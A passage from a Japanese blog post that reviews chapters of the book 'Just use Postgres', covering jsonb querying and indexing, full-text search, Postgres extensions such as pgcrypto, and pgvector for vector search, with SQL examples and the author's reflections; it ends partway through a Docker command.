the jsonb data type is the recommended default for storing and processing JSON data in Postgres, unless you have a specific use case that requires preserving the order of keys in the original JSON objects.「キーの順序を保持する必要がある」という特殊なケースでない限り、jsonb 一択です。私が過去に扱ったプロジェクトでは、なんとなく json を選んでいたことがありました。「書き込みが速いから」という理由で。でも、検索の度にパースが走るコストを考えていませんでした。典型的な「入口だけ見て出口を見ない」パターン。インフラエンジニアあるあるです。著者が書いているように、jsonb は write 時に変換コストがありますが、検索性能は圧倒的に速いです。そして GIN インデックスとの組み合わせでさらに速くなります。JSON のクエリ：-> と ->>5.4 節の JSON クエリ構文は充実しています。機能自体は知っていましたが、改めて整理すると活用の幅が広がります。基本：-> と ->>SELECT    order_id,    pizza->\'size\' as pizza_size,     -- JSON 形式で返す    pizza->>\'crust\' as pizza_crust  -- テキスト形式で返すFROM pizzeria.order_itemsWHERE order_id = 100;出力の違い。pizza_size   | pizza_crust-------------|-------------\\"small\\"      | thin-> は JSON 形式なのでダブルクォート付き。->> はテキスト型なのでダブルクォートなし。最初は「なぜ 2 つの演算子が必要なのか？」と疑問でしたが、5.4.1 節を読んで納得しました。WHERE 句での比較。-- JSON 形式で比較（ダブルクォート必要）WHERE pizza->\'size\' = \'\\"small\\"\'-- テキスト形式で比較（ダブルクォート不要）WHERE pizza->>\'crust\' = \'gluten_free\'-> でダブルクォートを忘れると、こんなエラーが出ます。DETAIL: Token \\"small\\" is invalid.CONTEXT: JSON data, line 1: smallこの仕様、最初はわかりにくいですが、JSON の仕様に忠実だと理解すれば納得できます。Rust から Postgres に接続して JSON を扱う時、この -> と ->> の違いでハマりました。-> は JSON 型を返すので、そのまま文字列としてデシリアライズしようとするとエラーになります。->> を使うか、適切な型変換が必要です。特に pg_typeof() で型を確認しようとした時、::TEXT でキャストしないと Rust 側でエラーになりました。ネストした JSON へのアクセスSELECT    order_id,    pizza->\'toppings\'->\'veggies\' as veggies_toppingsFROM pizzeria.order_itemsWHERE order_id = 100;出力。veggies_toppings-----------------------[{\\"tomato\\": \\"light\\"}]配列の特定要素にアクセスするには、インデックス（0 始まり）を指定。SELECT    order_id,    pizza->\'toppings\'->\'veggies\'->0 as veggies_toppingsFROM pizzeria.order_itemsWHERE order_id = 100;出力（[] が消える）。veggies_toppings---------------------{\\"tomato\\": \\"light\\"}さらに、配列内のオブジェクトのフィールドにアクセスします。SELECT    order_id,    pizza->\'toppings\'->\'veggies\'->0->>\'onion\' as onions_amountFROM pizzeria.order_itemsWHERE order_id = 100;出力。onions_amount---------------lightこの連鎖、最初は読みづらいと思いましたが、慣れると直感的です。? 演算子と @> 演算子? 演算子：キーの存在確認SELECT    order_id,    pizza->\'toppings\'->\'meats\' as meatsFROM pizzeria.order_itemsWHERE pizza->\'toppings\' ? \'meats\'ORDER BY order_id LIMIT 5;「meats キーが存在する注文だけを取得」という意味です。配列内のオブジェクトのキー存在確認は少し複雑になります。SELECT    order_id,    pizza->\'toppings\'->\'meats\' AS meatsFROM pizzeria.order_itemsWHERE EXISTS (    SELECT 1    FROM jsonb_array_elements(pizza->\'toppings\'->\'meats\') AS meats    WHERE meats ? \'sausage\')ORDER BY order_id LIMIT 5;この書き方、正直、冗長だと思いました。でも著者も同じ意見で、5.4.4 節で JSON path expression を使ってシンプルにしています。@> 演算子：包含関係の確認SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"crust\\": \\"gluten_free\\"}\';「crust フィールドが gluten_free の注文を数える」という意味です。複数条件。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"crust\\": \\"gluten_free\\", \\"type\\": \\"custom\\"}\';ネストした構造も可能。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"crust\\": \\"gluten_free\\", \\"type\\": \\"custom\\",                 \\"toppings\\": {\\"veggies\\": [{\\"tomato\\": \\"extra\\"}]}}\';この演算子、MongoDB の $elemMatch みたいな感じだと思いました。ちなみに、@> 演算子は配列にも使えます。tags @> \'[\\"hot\\", \\"milk\\"]\' のように書けば、配列が特定の要素を含むかどうかを検索できます。JSON オブジェクトだけでなく、配列にも対応しているのは便利です。著者が「-> と @> を組み合わせるとより読みやすくなる」と書いています。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"crust\\": \\"gluten_free\\", \\"type\\": \\"custom\\"}\' AND      pizza->\'toppings\'->\'veggies\' @> \'[{\\"tomato\\": \\"extra\\"}]\';こっちの方が確かに読みやすいです。JSON Path Expressions5.4.4 節で、SQL/JSON path language が登場します。先ほどの「sausage を含む注文を検索」のクエリが、path expression でこうなります。SELECT    order_id,    pizza->\'toppings\'->\'meats\' AS meatsFROM pizzeria.order_itemsWHERE jsonb_path_exists(pizza, \'$.toppings.meats[*] ? (exists(@.sausage))\')ORDER BY order_id LIMIT 5;サブクエリが不要になりました。構文の説明です。$: 評価対象の JSON オブジェクト（pizza カラム）.toppings.meats: フィールドへのアクセス[*]: 配列のすべての要素?: フィルタの開始@: 現在評価中のオブジェクトexists(@.sausage): sausage フィールドが存在するか最初は読みづらかったですが、いくつか例を見ていくうちに理解できました。配列のクエリSELECT    count(*) as total_cnt,    jsonb_object_keys(        jsonb_path_query(pizza, \'$.toppings.cheese[*]\')    ) as cheese_toppingFROM pizzeria.order_itemsGROUP BY cheese_topping ORDER BY total_cnt DESC;$.toppings.cheese[*] で cheese 配列のすべてのオブジェクトを取得。jsonb_object_keys で各オブジェクトのキー（チーズ名）を抽出。出力。total_cnt | cheese_topping----------|----------------     2575 | mozzarella      771 | cheddar      762 | parmesanフィルタ付き path expressionSELECT    count(*) AS total_cnt,    pizza->\'type\' as pizza_typeFROM pizzeria.order_itemsWHERE jsonb_path_exists(pizza,        \'$.toppings.cheese[*] ? (exists(@.parmesan))\')GROUP BY pizza_typeORDER BY total_cnt DESC;評価順序。$.toppings.cheese[*]: すべてのチーズオブジェクトを取得?: フィルタ開始exists(@.parmesan): 現在のオブジェクトに parmesan フィールドがあるか複数フィルタのチェーンSELECT count(*)FROM pizzeria.order_itemsWHERE jsonb_path_exists(    pizza,    \'$ ? (@.type == \\"custom\\") .toppings.cheese[*].parmesan ? (@ == \\"extra\\")\');評価順序（左から右）です。$: pizza オブジェクト? (@.type == \\"custom\\"): type が custom か確認.toppings.cheese[*].parmesan: parmesan オブジェクトを取得? (@ == \\"extra\\"): 量が extra か確認この書き方、最初は難解だと思いましたが、左から右に評価されると理解すれば読めます。JSON の更新：jsonb_set と #-5.5 節で JSON の更新方法が紹介されています。最も簡単な方法（非推奨）-- アプリ側で JSON 全体を取得SELECT pizza FROM pizzeria.order_items WHERE order_id = $1 and order_item_id = $2;-- アプリ側で JSON を修正-- DB に書き戻すUPDATE pizzeria.order_itemsSET pizza = new_pizza_order_jsonWHERE order_id = $1 and order_item_id = $2;著者が書いているように、簡単だけど効率的じゃないです。複雑な JSON オブジェクト全体を転送するのではなく、必要なフィールドだけを更新する方が良いです。jsonb_set 関数UPDATE pizzeria.order_itemsSET pizza = jsonb_set(pizza, \'{crust}\', \'\\"regular\\"\', false)WHERE order_id = 20 and order_item_id = 5;jsonb_set の引数です。元の JSON オブジェクト（pizza）更新対象のパス（{crust}）新しい値（\\"regular\\" — JSON 文字列なのでダブルクォート必要）フィールドが存在しない場合に追加するか（false）ネストした配列の更新。UPDATE pizzeria.order_itemsSET pizza = jsonb_set(    pizza,    \'{toppings,veggies}\',   \'[{\\"tomato\\":\\"extra\\"}, {\\"spinach\\":\\"regular\\"}]\',   false)WHERE order_id = 20 and order_item_id = 5;配列の特定要素を更新する場合、パスにインデックスを含められる。-- 例：{toppings, veggies, 0, tomato} で配列の最初の要素の tomato を更新1 つ注意点があります。jsonb_set のパスが存在しない場合、第 4 引数が true なら新しいキーが作成されます。これは便利な反面、タイプミスで意図しないキーが追加されるリスクもあります。#- 演算子：フィールドの削除UPDATE pizzeria.order_itemsSET pizza = pizza #- \'{toppings,meats}\'WHERE order_id = 20 AND order_item_id = 5;{toppings, meats} パスのフィールドを削除します。この演算子、シンプルで良いです。インデックス：B-tree と GIN5.6 節がこの章で一番技術的に深い部分でした。Expression Index with B-tree最初の試みです。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza ->> \'type\' = \'custom\';実行計画。Seq Scan on order_items (actual time=0.034..1.062 rows=563 loops=1)  Filter: ((pizza ->> \'type\'::text) = \'custom\'::text)  Rows Removed by Filter: 2375Execution Time: 1.185 ms全件スキャンです。Expression Index を作成します。CREATE INDEX idx_pizza_typeON pizzeria.order_items ((pizza ->> \'type\'));再度実行計画を確認。Bitmap Index Scan on idx_pizza_type (actual time=0.068..0.068 rows=563 loops=1)  Index Cond: ((pizza ->> \'type\'::text) = \'custom\'::text)Execution Time: 0.376 ms4 倍近く高速化（1.185 ms → 0.376 ms）しました。でも問題があります。このインデックスは pizza ->> \'type\' というexact expression にしか効きません。-- これは idx_pizza_type を使わないSELECT count(*)FROM pizzeria.order_itemsWHERE pizza -> \'type\' = \'\\"custom\\"\';実行計画：Seq Scan に戻ります。さらに、別のフィールド（size など）を検索する場合、また別の Expression Index が必要になります。著者が書いているように、スケールしません。フィールドごとにインデックスを作り続けると、気づいたら「インデックスのインデックス」が欲しくなる世界へようこそ。GIN Index（Default）GIN（Generalized Inverted Index）を作成します。CREATE INDEX idx_pizza_orders_ginON pizzeria.order_itemsUSING GIN(pizza);GIN の仕組み（5.6.2 節の Figure 5.1 参照）です。JSON オブジェクトからすべてのキーと値を抽出して、個別のインデックスエントリとして保存します。例です。{  \\"size\\": \\"large\\",  \\"type\\": \\"three cheese\\",  \\"crust\\": \\"thin\\",  \\"sauce\\": \\"marinara\\",  \\"toppings\\": {    \\"cheese\\": [      {\\"cheddar\\": \\"regular\\"},      {\\"mozzarella\\": \\"extra\\"},      {\\"parmesan\\": \\"light\\"}    ]  }}インデックスに保存されるエントリです。Keys:- size、type、crust、sauce、toppings、cheese、cheddar、mozzarella、parmesanValues:- large、three cheese、thin、marinara、regular、extra、lightこれらのエントリは辞書順に保存され、複数のインデックスページに分散されます。GIN を使ったクエリです。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"type\\": \\"custom\\"}\';実行計画。Bitmap Index Scan on idx_pizza_orders_gin (actual time=0.109..0.110 rows=563 loops=1)  Index Cond: (pizza @> \'{\\"type\\": \\"custom\\"}\'::jsonb)Execution Time: 0.830 ms複雑なネスト構造でも使えます。SELECT count(*)FROM pizzeria.order_itemsWHERE pizza @> \'{\\"toppings\\":{\\"cheese\\":[{\\"cheddar\\":\\"regular\\"}]}}\';Postgres はインデックスから toppings, cheese, cheddar, regular の 4 つのエントリを検索して、該当する行を絞り込みます。GIN のメリット：1 つのインデックスで JSON 全体を検索可能です。GIN Index with jsonb_path_opsさらに効率的な GIN インデックスです。CREATE INDEX idx_pizza_orders_paths_ops_ginON pizzeria.order_itemsUSING GIN (pizza jsonb_path_ops);違いは、パス全体をハッシュ化して保存することです。例です。size.largetype.three cheesecrust.thinsauce.marinaratoppings.cheese.cheddar.regulartoppings.cheese.mozzarella.extratoppings.cheese.parmesan.lightこれらのパスをハッシュ関数に通して、固定長の整数として保存します。メリットです。検索が速い：固定長整数の比較は可変長テキストより速いサイズが小さい：ハッシュコードはテキストより小さい実際のサイズ比較です。index_name                      | index_size--------------------------------|------------idx_pizza_orders_gin            | 112 kBidx_pizza_orders_paths_ops_gin  | 56 kB半分のサイズです。デメリットです。jsonb_path_ops は ? 演算子（キー存在確認）をサポートしません。なぜなら、インデックスにはパスのハッシュのみが保存されていて、キー単体は保存されていないからです。-- これは idx_pizza_orders_gin を使う（jsonb_path_ops は使えない）SELECT count(*)FROM pizzeria.order_itemsWHERE pizza ? \'special_instructions\';使い分け インデックスタイプ  サイズ  検索速度  サポート演算子  推奨用途  Expression Index (B-tree)  小  特定 expression のみ速い  ->, ->>  特定フィールドの頻繁な検索  GIN (default)  大  速い  ?, @>, @?, @@  柔軟な検索、キー存在確認が必要  GIN (jsonb_path_ops)  中  最速  @>, @?, @@  包含検索のみ、サイズ重視 著者が書いているように、jsonb_path_ops が第一選択です。キー存在確認が必要なら default GIN を追加します。6. Postgres for full-text search「全文検索は難しい」という思い込みこの章を読み終えて思ったのは、「Postgres の全文検索は、思ったより実用的だ」ということです。私はこれまで、全文検索といえばElasticsearchだと思っていました。実際、過去のプロジェクトで「検索機能が必要です」と言われたら、反射的に「Elasticsearch を構築しますか？」と答えていました。まるで、パブロフの犬のように。「検索」という言葉を聞いただけで、脳内で Kibana のダッシュボードが立ち上がっていました。でも、第 1 章で学んだ「Just use Postgres」の真の意味を思い出します。「別のデータベースを追加する前に、まず Postgres で解決できるか確認してみよう」この章は、その実践編でした。Tokenization と Normalization の仕組み6.1 節では、Postgres が全文検索をどう実現しているかが説明されています。基本的な流れは 4 ステップです。Tokenization（トークン化）: 文書を単語やフレーズに分割Normalization（正規化）: トークンを lexeme（語彙素）に変換Storing and Indexing: lexeme を tsvector 型で保存し、インデックスを作成Searching: 保存した lexeme に対してクエリを実行著者が ts_debug 関数を使って、\\"5 explorers are traveling to a distant galaxy\\" という文がどう処理されるかを見せてくれます。SELECT token, description, lexemes, dictionaryFROM ts_debug(\'5 explorers are traveling to a distant galaxy\');結果を見ると、\\"explorers\\" は \\"explor\\" に、\\"traveling\\" は \\"travel\\" に変換されています。ストップワード（\\"are\\", \\"to\\", \\"a\\"）は空の lexeme {} にマッピングされています。これがステミング（語幹抽出）です。試しに to_tsvector(\'english\', \'running runs runner\') を実行してみると、\'run\':1,2 \'runner\':3 と返ってきます。running と runs は run に統一されています。だから「running」で検索しても「runs」がヒットする。これは便利です。位置情報を保持しながらストップワードを削除するという設計が巧妙です。<-> (FOLLOWED BY) オペレータで距離を計算するために、ストップワードの位置も必要になるからです。Elasticsearch でも同じようなことをやっているはずですが、Postgres ではこれが標準機能だということに改めて気づかされました。複数言語への対応6.1.2 節では、Full-text search configuration が紹介されています。Postgres には英語だけでなく、アラビア語、ロシア語、日本語など、多数の言語用の predefined configuration が用意されています。SELECT token, description, lexemes, dictionaryFROM ts_debug(\'russian\',\'5 исследователей путешествуют к далёкой галактике.\');ロシア語の例を見ると、russian_stem 辞書が使われています。\\"исследователей\\" が \\"исследовател\\" に、\\"путешествуют\\" が \\"путешеств\\" に変換されています。これも Elasticsearch でやろうとすると、analyzer の設定が複雑になります。JSON の設定ファイルを書いて、tokenizer を選んで、filter を設定して、mapping を更新する作業が必要です。設定の沼にハマっていきます。Postgres ではデフォルトで対応しています。でも、ここで疑問が湧きました。日本語はどうなんだろう？この本では日本語の例は出てきません。調べてみると、日本語は形態素解析が必要で、Postgres の標準機能だけでは難しいようです。pg_bigm（2-gram ベース）や pgroonga（Groonga ベース）といった拡張機能が必要になります。「Postgres で試した？」と聞き返す前に、日本語対応が必要かどうかは確認が必要な部分だと思いました。英語圏のサービスなら問題ないですが、日本語がメインなら追加の検討が必要です。tsvector と generated column の活用6.2 節では、生成した lexeme をどう保存するかが説明されています。3 つの選択肢があります。On-the-fly 生成: クエリごとに to_tsvector を実行（非効率）Column に保存: tsvector 型のカラムを追加して保存（推奨）Index のみ: テーブルには保存せず、直接インデックス作成（ストレージ節約）著者は 2 番目の方法を推奨しています。ALTER TABLE omdb.moviesADD COLUMN lexemes tsvectorGENERATED ALWAYS AS (  to_tsvector(    \'english\', coalesce(name, \'\') ||    \' \' ||    coalesce(description, \'\'))) STORED;GENERATED ALWAYS AS ... STORED という構文が便利です。これで、name や description が変更されると、lexemes も自動的に再生成されます。ただし、configuration は明示的に指定する必要があります（\'english\'）。これは、generated column の式が immutable でなければならないからです。この辺りの設計判断は、実際に運用してみないと分からない部分が多そうです。全文検索クエリの実行6.3 節では、実際のクエリの書き方が紹介されています。plainto_tsquery: シンプルなクエリSELECT id, nameFROM omdb.moviesWHERE lexemes @@ plainto_tsquery(\'a computer animated film\');plainto_tsquery は、ユーザーが入力した自然な文章を tsquery 型に変換してくれます。ストップワード（\\"a\\"）を削除し、残りの単語を lexeme に変換して、& (AND) オペレータで結合します。結果：\'comput\' & \'anim\' & \'film\'この手軽さが良いです。Elasticsearch なら、query DSL を書く必要があります。plainto_tsquery と to_tsquery の違いを実際に確認してみました。plainto_tsquery(\'english\', \'ghost in shell\') は \'ghost\' & \'shell\' を返します。「in」はストップワードとして除去されています。一方、to_tsquery は構文を直接指定できるので、OR 検索や NOT 検索も可能です。to_tsquery: 高度なフィルタリングSELECT id, nameFROM omdb.moviesWHERE lexemes @@ to_tsquery(\'computer & animated      & (lion | clownfish | donkey)\');to_tsquery を使えば、AND、OR、NOT、FOLLOWED BY などのオペレータを直接指定できます。SELECT id, nameFROM omdb.moviesWHERE lexemes @@ to_tsquery(\'lion & !\'\'The Lion King\'\'\');NOT オペレータで特定のフレーズの除外も可能です。この柔軟性は、Elasticsearch と変わりません。むしろ、SQL の中で完結するので、アプリケーション側のコードがシンプルになります。ランキングと重み付け6.4 節では、検索結果のランキングが扱われています。ts_rank による関連度スコアSELECT id, name, vote_average,  ts_rank(lexemes, to_tsquery(\'ghosts\')) AS search_rankFROM omdb.moviesWHERE lexemes @@ to_tsquery(\'ghosts\')ORDER BY search_rank DESC, vote_average DESC NULLS LAST LIMIT 10;ts_rank 関数は、lexeme の出現頻度と位置に基づいてスコアを計算します。でも、最初の実行例では、タイトルに \\"ghost\\" が含まれる映画と、説明文にだけ含まれる映画が同じように扱われていました。setweight による重み付けALTER TABLE omdb.moviesADD COLUMN lexemes tsvectorGENERATED ALWAYS AS (    setweight(to_tsvector(\'english\', coalesce(name, \'\')), \'A\') ||    setweight(to_tsvector(\'english\', coalesce(description, \'\')), \'B\')) STORED;setweight 関数で、タイトル由来の lexeme に A ラベル、説明文由来の lexeme に B ラベルを付けます。重みは A > B > C > D の順で、デフォルトは D です。これで、ts_rank はタイトルに含まれる単語をより高くランク付けするようになります。   id   |         name          | vote_average | search_rank--------+-----------------------+--------------+-------------    251 | Ghost                 | 6.3333301544 |   0.6957388 210675 | A Most Annoying Ghost |              |   0.6957388   1548 | Ghost World           | 8.1428575516 |  0.66871977タイトルへ \\"ghost\\" が含まれる映画が上位へ来るようになりました。この重み付けのメカニズムは、Elasticsearch の boosting と同じ発想です。でも、Postgres では setweight 一発で実現できます。ハイライト表示6.5 節では、ts_headline 関数が紹介されています。SELECT id, name, description,    ts_headline(description, to_tsquery(\'pirates\')) AS fragments,    ts_rank(lexemes, to_tsquery(\'pirates\')) AS rankFROM omdb.moviesWHERE lexemes @@ to_tsquery(\'pirates:B\')ORDER BY rank DESC LIMIT 1;結果はこうなります。fragments   | <b>pirate</b> Captain Jack is in a battle with the ocean ➥  itself. Jack knows it won\'t be easyマッチした単語を <b> タグで囲んでくれます。さらに、オプションでカスタマイズも可能です。ts_headline(description, to_tsquery(\'pirates\'),    \'MaxFragments=3, MinWords=5, MaxWords=10,     FragmentDelimiter=<ft_end>\') AS fragmentsただし、著者が警告している通り、XSS 攻撃のリスクがあります。HTML マークアップを含む文書を扱う場合は、サニタイズが必要です。この辺りは、Elasticsearch でも同じ問題があります。ハイライト機能は便利ですが、セキュリティには注意が必要です。インデックスの選択：GIN vs GiST6.6 節では、全文検索を高速化するためのインデックスが説明されています。GIN インデックスCREATE INDEX idx_movie_lexemes_ginON omdb.moviesUSING GIN (lexemes);GIN（Generalized Inverted Index）は、全文検索に最適化されたインデックスです。各 lexeme ごとにインデックスエントリを作成し、その lexeme を含むテーブル行への参照を保持します。実行計画を見ると、Seq Scan（15.328 ms）から Bitmap Index Scan（0.150 ms）に変わっています。100 倍以上の高速化です。ただし、GIN インデックスは positional information を保存しません。<-> (FOLLOWED BY) オペレータを使うクエリでは、テーブル行を再確認する必要があります。この制約を解決したい場合は、RUM インデックス（Postgres 拡張）を使うと良いようです。GiST インデックスCREATE INDEX idx_movie_lexemes_gistON omdb.moviesUSING GIST (lexemes);GiST（Generalized Search Tree）は、signature tree を構築します。各文書の signature（ビット列）を作成し、lexeme の signature を bitwise OR で結合します。実行時間は 0.395 ms で、GIN（0.150 ms）より遅いです。理由は、signature collision が発生するため、マッチした文書をテーブル行で再確認する必要があるからです。でも、GiST は インデックスサイズが小さく、更新が速いという特徴があります。使い分け著者の推奨はこうです。GIN: 検索速度が最重要で、インデックスメンテナンスコストを許容できる場合GiST: インデックスサイズや更新速度が重要な場合この辺りの判断は、データ量や更新頻度によって変わります。実際に両方試してみる価値があります。Postgres の限界を認識するもちろん、Postgres の全文検索にも限界はあります。日本語の形態素解析はサポートされていない（可能性が高い）大規模データ（数億レコード）では Elasticsearch の方が速い可能性がある分散検索や複雑な aggregation は Elasticsearch の方が得意でも、多くのケースでは Postgres で十分というのがこの章の主張です。7. Postgres extensions拡張性こそが「Just use Postgres」の核心第 7 章を読んで、ようやく腑に落ちました。「Just use Postgres」というモットーは、Postgres の拡張機能によって生まれました。この一文を読んだとき、第 1 章の理解が深まりました。In fact, the motto \\"Just use Postgres\\" emerged largely due to its rich ecosystem of extensions, which allow us to use the database well beyond the use cases covered in the earlier chapters of the book.第 1 章では「新しいユースケースが発生したとき、まず Postgres で解決できるか確認しよう」という意味だと学びました。でも、なぜ Postgres で解決できるのかという根拠は曖昧でした。答えは拡張機能でした。JSON、全文検索、時系列、地理空間、メッセージキュー、ベクトル検索——これら全て、Postgres の拡張機能が可能にしています。第 2 章から第 6 章までは、コア機能を使ったユースケースでした。でも、それは「氷山の一角」だったんです。本当の多様性は拡張機能にあります。Michael Stonebraker のビジョン7.1 節で、Postgres の拡張性が生まれた背景が語られています。Michael Stonebraker（チューリング賞受賞者）の言葉が印象的でした。1980 年代、多くの研究論文が同じことを言っていました：「リレーショナルデータベースは素晴らしいと言われているが、実際には特定のシナリオでまったく機能しない」そして、それぞれの論文が独自の解決策を提案していました。Stonebraker はこう考えました：それぞれの問題へ個別の解決策を追加するのではなく、RDBMS が特定のユースケースへ適応できるようにする、より良い方法があるはずだ。この哲学が、Postgres の設計思想の根幹になっています。拡張性が Postgres の強みであることは知っていました。ただ、この章を読んで、Postgres は最初から拡張性を前提に設計されているという設計思想を改めて確認できました。インフラエンジニアとして、この設計思想は深く刺さります。運用の現場では、予期しないユースケースが次々に現れます。そのたびに新しいデータベースを追加していたら、運用負荷は青天井です。気づけば Kubernetes クラスタの中に MongoDB、Redis、Elasticsearch、TimescaleDB、Neo4j が同居しています。「あれ、俺たちデータベース動物園を運用してたっけ？」と遠い目をする羽目になります。Postgres は、そういう現実を 40 年以上前から見据えていたんです。拡張性を支える 3 つの基盤7.2 節では、Postgres の拡張性を支える技術的な基盤が説明されています。カタログ駆動操作Postgres は、テーブル、カラム、データ型、関数などのメタデータをシステムカタログに保存しています。これは通常のテーブルと似た構造で、拡張機能はこのカタログを読み書きできます。これ、地味だけど重要だと思いました。システムカタログが「普通のテーブルのような構造」だから、拡張機能が新しいデータ型や関数を追加できます。もし、メタデータが隠蔽された独自フォーマットだったら、拡張機能の開発はもっと難しかったでしょう。データベースフックPostgres のコードベースには、拡張機能がカスタムロジックを注入できるフックポイントが定義されています。クエリ計画、実行、認証など、様々なイベントにフックできます。これ、Linux カーネルの LSM（Linux Security Modules）に似ていると思いました。カーネル本体を変更せずに、セキュリティポリシーを注入できる仕組みです。Postgres も同じ哲学です。コアエンジンを変更せずに、動作を拡張できます。動的ロード拡張機能のロジックは、SQL、PL/pgSQL、C、Rust など、様々な言語で書けます。SQL や PL/pgSQL で書かれた拡張機能は、データベースエンジンが直接解釈します。C や Rust で書かれた拡張機能は、共有ライブラリとして実行時に動的にロードされます。コアエンジンの再コンパイルが不要です。これが重要です。もし、拡張機能を追加するたびに Postgres 本体を再コンパイルしなければならないとしたら、運用はほぼ不可能でした。動的ロードのおかげで、拡張機能の追加・削除が柔軟にできます。pgcrypto を使ってみた感覚7.2.2 節では、pgcrypto 拡張機能を使ったユーザー認証の例が紹介されています。CREATE EXTENSION pgcrypto;INSERT INTO accounts (username, password_hash)VALUES (\'ahamilton\', crypt(\'SuperSecret123\', gen_salt(\'bf\')));gen_salt(\'bf\') で Blowfish アルゴリズムを使ったソルトを生成し、crypt() で平文パスワードとソルトからハッシュを生成します。この例を読んで、「データベース内で暗号化を完結させる」という選択肢があることに気づきました。これまで、パスワードのハッシュ化はアプリケーション層でやるものだと思い込んでいました。でも、pgcrypto を使えば、データベース層でも実装できます。どちらが良いかはケースバイケースでしょう。でも、選択肢があることを知っておくのは重要です。認証のクエリも興味深いです。SELECT username FROM accountsWHERE username = \'ahamilton\'AND password_hash = crypt(\'SuperSecret123\', password_hash);crypt() 関数に、平文パスワードと保存済みのハッシュを渡します。関数がハッシュからソルトを抽出し、再計算して比較します。この設計、エレガントだと思いました。ソルトを別カラムに保存する必要がありません。ハッシュ自体にソルトが含まれています。ちなみに、bcrypt のコストパラメータ（gen_salt(\'bf\', 8) の 8 の部分）は、8〜12 が推奨されています。数字が大きいほどハッシュ計算に時間がかかりますが、セキュリティは向上します。拡張機能の 5 つのカテゴリ7.3 節では、拡張機能を 5 つのカテゴリに分類しています。\\"Postgres beyond relational\\"Postgres を従来の RDBMS を超えた用途に拡張します。pgvector、pg_ai、pgvectorscale: ベクトルデータベース（生成 AI ワークロード）TimescaleDB: 時系列データベースPostGIS: 地理空間データベースpgmq: メッセージキューpg_duckdb: 高性能分析ワークロード（DuckDB の列指向エンジンを埋め込み）これらが「Just use Postgres」を可能にしている拡張機能です。「Elasticsearch で検索やりたい」「MongoDB で JSON 保存したい」「Redis でキューやりたい」というよくある要求があります。これらに対して、「まず Postgres で試した？」と聞き返せる根拠です。過去の自分に教えてあげたいです。技術選定会議で『最新トレンド』として提案された 3 つのデータベース、実は Postgres の拡張機能で済むやつだから、と。プログラミング言語と手続き型言語第 2 章で PL/pgSQL を学びましたが、それだけではありません。PLV8: JavaScriptPL/Java: JavaPL/Python: PythonPL/Rust: Rust自分の得意な言語で、データベース関数やプロシージャを書けます。特に PLV8 の説明が興味深いです。V8 JavaScript エンジンを Postgres に埋め込むだけでなく、PgCompute クライアントライブラリと組み合わせることで実現します。アプリケーションから SQL を介さずに JavaScript 関数を直接実行できます。これ、SQL とアプリケーションロジックの境界を曖昧にする、面白いアプローチだと思いました。コネクタと外部データラッパー外部のデータソースを、あたかも Postgres のテーブルであるかのようにクエリできます。file_fdw: ファイルシステムからデータを読むpostgres_fdw、mysql_fdw、oracle_fdw、sqlite_fdw: 他の SQL データベースに接続redis_fdw、parquet_s3_fdw、kafka_fdw: Redis、S3、Kafka などの非 SQL データソースに接続Postgres を統合データレイヤーとして使えます。これ、マイクロサービスアーキテクチャで複数のデータソースを扱う場合に便利そうです。各サービスが独自のデータベースを持っていても、Postgres を経由して統一的にクエリできます。でも、パフォーマンスはどうなんでしょう。ネットワーク越しにクエリを投げるわけですから、レイテンシーは増えるはずです。この辺りは実際に試してみないとわかりません。（試した結果「遅い！」ってなって、結局専用のデータ同期パイプラインを構築するところまでがテンプレ。）クエリとパフォーマンス最適化pg_stat_statements: SQL 文の実行統計を追跡auto_explain: 遅いクエリの実行計画を自動ログhypopg: 仮想インデックスのテストauto_explain は便利そうです。普段、遅いクエリを見つけたら、手動で EXPLAIN ANALYZE を実行しています。でも、auto_explain があれば、自動的にログに記録してくれます。hypopg も面白いです。実際にインデックスを作らずに、仮想的にテストできます。本番環境で「このインデックス、効果あるかな？」と試す前に、リスクなしで検証できます。ツールとユーティリティpg_cron: cron ベースのスケジューラーPostgreSQL Anonymizer: 個人情報の匿名化pgaudit: 監査ログpg_partman: パーティション管理の簡素化pg_cron があれば、データベース内で定期タスクを実行できます。外部の cron や Airflow を使わずに。「Just use Postgres」の精神に沿っています。Postgres 互換ソリューション7.4 節では、Postgres の拡張機能ではなく、Postgres のプロトコルやソースコードを活用した別のソリューションが紹介されています。拡張機能で解決できない問題のために、こういった選択肢があります。ゼロから構築されたソリューションGoogle SpannerCockroachDBPostgres のワイヤレベルプロトコル、DML/DDL 構文、一部の機能をサポートしています。でも、内部実装は完全に別物です。分散データベースとしての可用性とスケーラビリティを提供します。Postgres ソースコードをベースにしたソリューションNeon（サーバーレスデータベース）YugabyteDB（分散データベース）Postgres のソースコードを再利用しつつ、ストレージレイヤーを変更・拡張しています。Postgres のアプリケーションをそのまま実行できます。ライブラリ、ツール、フレームワークもそのまま使えます。この 2 つのアプローチの違いは興味深いです。ゼロから構築したソリューションは、自由度が高い反面、Postgres との互換性は限定的になります。Postgres ソースコードベースのソリューションは、互換性が高い反面、アーキテクチャの変更範囲は制約されます。どちらが良いかは、ユースケース次第です。でも、どちらも「Postgres のエコシステムを活用したい」という需要から生まれています。それだけ、Postgres が広く使われているということです。8. Postgres for generative AIPostgres が Vector Database になる瞬間第 8 章を読んで最初に感じたのは、「Just use Postgres」が生成 AI の時代でも貫かれているということでした。「RAG を実装するなら Pinecone か Weaviate を使おう」——これまでそう考えていました。でも、著者が示すのは違います。Postgres can serve as a powerful vector database for implementing RAG and other gen AI use cases.既に Postgres を使っているなら、まず Postgres で試してみよう。この章はその具体的な実装方法を示しています。pgvector という選択肢pgvector という拡張を有効化するだけで、Postgres が Vector Database になります。CREATE EXTENSION vector;たったこれだけ。新しいデータベースを立てる必要がありません。（「Vector Database 導入提案書」を 3 日かけて書いた過去の自分に教えてあげたい...）vector(1024) という型が使えるようになります。1024 次元のベクトル埋め込みを格納できます。映画の説明文を mxbai-embed-large モデルで変換した埋め込みを、そのまま Postgres のカラムに保存できます。CREATE TABLE omdb.movies (    id BIGINT PRIMARY KEY,    name TEXT NOT NULL,    description TEXT NOT NULL,    movie_embedding VECTOR(1024),    ...);この手軽さ。Docker で pgvector 入りの Postgres を起動するだけで試せます。docker run --name postgres-pgvector \\\\    -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=password \\\\    -p 5432:5432 